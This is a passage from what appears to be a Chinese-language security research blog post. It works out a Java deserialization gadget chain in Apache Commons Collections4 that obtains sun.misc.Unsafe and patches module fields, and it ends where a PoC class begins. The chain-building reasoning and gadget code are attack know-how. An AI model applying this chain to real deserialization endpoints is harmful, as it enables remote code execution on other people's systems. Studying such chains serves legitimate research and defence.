+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">O</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">iConstant</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><h3 id="21-怎么实现unsafe">2.1 怎么实现Unsafe<a hidden class="anchor" aria-hidden="true" href="#21-怎么实现unsafe">#</a></h3>
+<p>说干就干，慢着，你是说用<code>invokerTransformer</code>来实现下面这段代码？</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">patchModule</span><span class="p">(</span><span class="n">Class</span><span class="w"> </span><span class="n">clazz</span><span class="p">,</span><span class="n">Class</span><span class="w"> </span><span class="n">goalclass</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Class</span><span class="w"> </span><span class="n">UnsafeClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.misc.Unsafe&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Field</span><span class="w"> </span><span class="n">unsafeField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UnsafeClass</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;theUnsafe&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">unsafeField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Unsafe</span><span class="w"> </span><span class="n">unsafe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Unsafe</span><span class="p">)</span><span class="n">unsafeField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Object</span><span class="w"> </span><span class="n">ObjectModule</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;getModule&#34;</span><span class="p">).</span><span class="na">invoke</span><span class="p">(</span><span class="n">goalclass</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Class</span><span class="w"> </span><span class="n">currentClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">long</span><span class="w"> </span><span class="n">addr</span><span class="o">=</span><span class="n">unsafe</span><span class="p">.</span><span class="na">objectFieldOffset</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;module&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">unsafe</span><span class="p">.</span><span class="na">getAndSetObject</span><span class="p">(</span><span class="n">currentClass</span><span class="p">,</span><span class="n">addr</span><span class="p">,</span><span class="n">ObjectModule</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>我们化简，也就要执行<code>unsafe.getAndSetObject(currentClass,addr,ObjectModule);</code>这句代码</p>
+<p>那就要好好理解<code>invokerTransformer.transform</code>中的逻辑了</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">O</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  </span><span class="c1">//化简下</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">final</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">cls</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="na">getClass</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">final</span><span class="w"> </span><span class="n">Method</span><span class="w"> </span><span class="n">method</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cls</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="n">iMethodName</span><span class="p">,</span><span class="w"> </span><span class="n">iParamTypes</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">O</span><span class="p">)</span><span class="w"> </span><span class="n">method</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">input</span><span class="p">,</span><span class="w"> </span><span class="n">iArgs</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></div><h4 id="尝试"><strong>尝试</strong><a hidden class="anchor" aria-hidden="true" href="#尝试">#</a></h4>
+<ol>
+<li>那我们能不能直接<code>传个Unsafe对象</code>呢？no</li>
+</ol>
+<p>Unsafe不能反序列化</p>
+<ol start="2">
+<li>后面想到<code>getRuntime</code>,然后去看发现有<code>getUnsafe</code>可以获得Unsafe对象</li>
+</ol>
+<blockquote>
+<p>但是其实用不了hhh，不然干嘛还通过反射获得Unsafe对象嘛hhh。该方法还有<code>@CallerSensitive</code>这个注释会对调用者的<code>classLoader</code>进行检查，判断当前类是否由<code>Bootstrap classLoader</code>加载，如果不是的话就会抛出一个<code>SecurityException</code>异常。</p>
+</blockquote>
+<ol start="3">
+<li>因为受到Runtime的构造和<code>final Class&lt;?&gt; cls = input.getClass();</code>这句代码的影响，我一直觉得要得到Unsafe对象才能进行调用。因为你传入的<code>Unsafe.class</code>经过<code>input.getClass()</code>，都会变成<code>Class.class</code>，会没有用的。我昨天这里一度以为无解了hhh</li>
+</ol>
+<p>后面我一直看代码，发现getRuntime费那么大劲是因为<code>Class</code>没这个方法，但是有<code>getDeclaredField</code>，<code>setAccessible</code>这些方法。而Runtime对象也是为了exec的调用，并不是前面就要有对象才能调用。而且前面调用(<code>Field unsafeField = UnsafeClass.getDeclaredField(&quot;theUnsafe&quot;);</code>)本来就是通过<code>Unsafe.class</code>调用的，而不是Unsafe对象调用的，怎么就不能调用了？</p>
+<ol start="4">
+<li>这个想法通尝试发现是可以，但是又有个问题</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">unsafeField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Unsafe</span><span class="w"> </span><span class="n">unsafe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Unsafe</span><span class="p">)</span><span class="n">unsafeField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></div><p><code>theUnsafe</code>是<code>private</code>，<strong>setAccessible</strong>这个调用不能少，就意味着<code>unsafeField</code>这个Filed对象得<code>被调用两次</code>，但是这在<code>invokerTransformer</code>中怎么可能实现呢？于是我想了能不能在外面执行<code>unsafeField.setAccessible(true);</code>，然后把<code>unsafeField</code>传到<code>invokerTransformer</code>中，其实不行<code>Field</code>也不继承<code>Serializable</code>啊，想p吃呢hhh</p>
+<h4 id="解决"><strong>解决</strong><a hidden class="anchor" aria-hidden="true" href="#解决">#</a></h4>
+<p>然后又思考了片刻，如果靠链子解决的话，那大概需要一个这样的结构吧</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">iTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">input</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">input</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>这里<code>iTransformer.transform(input);</code>去执行<code>unsafeField.setAccessible(true);</code>这段内容，执行完后还能返回之前的对象，后面正常调用。这样大概就能<code>实现同一个对象被调用2次了！</code></p>
+<p>然后我就去找实现<code>transform</code>方法的类，其实不多，但是找下来基本上没什么吊用？但是注意到有一些类有<code>execute</code>，<code>evaluate</code>方法，但是实现<code>transform</code>方法的类里面又没看到那个对这个两个方法进行了调用。这里稍微有点蹊跷了，然后又去网上找了下思路，就看到之前CC改编的一些链子。然后看到一个对<code>create()</code>方法的调用，然后这个类其实没实现transform，但是他有<code>create()</code>。这里我也有点感觉了那<code>execute</code>，<code>evaluate</code>方法也很有可能是想用一个包下的类，于是我就去这个包下面一通找，hhh如果让我发现了点什么hhh</p>
+<p><img loading="lazy" src="../images/image-20250110192555928.png" alt="image-20250110192555928"  />
+</p>
+<p>我之所以会有上面这个想法，也是找<code>transform()</code>方法的时候，看到下面这两个调用，就很符合我的思路（<code>看代码注释！</code>）</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ClosureTransformer</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">iClosure</span><span class="p">.</span><span class="na">execute</span><span class="p">(</span><span class="n">input</span><span class="p">);</span><span class="w">     </span><span class="c1">//只要execute中可以控制调用transform，即可</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">input</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">IfTransformer</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="n">O</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">I</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">iPredicate</span><span class="p">.</span><span class="na">evaluate</span><span class="p">(</span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">iTrueTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">iFalseTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">input</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//因为这里是三元表达式，所以其实会执行两句代码</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//所以这里 evaluate(input) 可以控制调用transform，即可</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>然后其实感觉找到了很多可以用的。先写比较麻烦的吧，因为好用的都是后面才遇到wwww(调用想法就写到代码注释里吧方便点</p>
+<h5 id="找到的一些类">找到的一些类<a hidden class="anchor" aria-hidden="true" href="#找到的一些类">#</a></h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ComparatorPredicate</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">evaluate</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="n">target</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">boolean</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">final</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">comparison</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">comparator</span><span class="p">.</span><span class="na">compare</span><span class="p">(</span><span class="n">object</span><span class="p">,</span><span class="w"> </span><span class="n">target</span><span class="p">);</span><span class="c1">//这里是看到了compare，然后CC4这条链子也是有这个调用点，然后想能不能通过这里调用到transform，看了下compare()相关代码感觉是可行的但是有点麻烦</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">criterion</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="n">EQUAL</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">comparison</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">break</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="n">GREATER</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">comparison</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">break</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="n">LESS</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">comparison</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">break</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="n">GREATER_OR_EQUAL</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">comparison</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">break</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="n">LESS_OR_EQUAL</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">comparison</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">break</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">default</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">IllegalStateException</span><span class="p">(</span><span class="s">&#34;The current criterion &#39;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">criterion</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;&#39; is invalid.&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">result</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">EqualPredicate</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">evaluate</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="n">object</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">equator</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">equator</span><span class="p">.</span><span class="na">equate</span><span class="p">(</span><span class="n">iValue</span><span class="p">,</span><span class="w"> </span><span class="n">object</span><span class="p">);</span><span class="w"> </span><span class="c1">//这个是想到equate，equals也有相关的链子，这个未证实，感觉有就记录了</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">iValue</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">object</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><h5 id="比较好用的">比较好用的<a hidden class="anchor" aria-hidden="true" href="#比较好用的">#</a></h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">TransformerPredicate</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">evaluate</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="n">object</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">final</span><span class="w"> </span><span class="n">Boolean</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">iTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">object</span><span class="p">);</span><span class="c1">//这个需要有结果，但是setAccessible返回是void，所以这个可能用不了</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">result</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FunctorException</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="s">&#34;Transformer must return an instanceof Boolean, it was a null object&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">result</span><span class="p">.</span><span class="na">booleanValue</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p><strong>好用的</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">TransformedPredicate</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">evaluate</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="n">object</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">final</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">iTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">object</span><span class="p">);</span><span class="w"> </span><span class="c1">//这里不就完美了么hhh</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">iPredicate</span><span class="p">.</span><span class="na">evaluate</span><span class="p">(</span><span class="n">result</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">TruePredicate</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">evaluate</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="n">object</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">    </span><span class="c1">//这个控制下iPredicate.evaluate(result);结果，增加链子稳定性</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p><strong>最好用的</strong></p>
+<p>这个是我唯一记录的一个<code>execute</code>方法的，但确实最好用的www，不是哥们？你直接就是<code>梦中情execute</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">TransformerClosure</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">execute</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">E</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">iTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">input</span><span class="p">);</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><h5 id="demo">demo<a hidden class="anchor" aria-hidden="true" href="#demo">#</a></h5>
+<p>那么我最后选择了这套组合</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ClosureTransformer</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">iClosure</span><span class="p">.</span><span class="na">execute</span><span class="p">(</span><span class="n">input</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">input</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">TransformerClosure</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">execute</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">E</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">iTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">input</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>可以成功得到<code>Unsafe对象</code>，nice捏，这里我就直接拿我测试的poc了</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.Transformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.functors.*</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">sun.misc.Unsafe</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.Templates</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Method</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">test</span><span class="w"> </span><span class="p">{</span><span class="w">
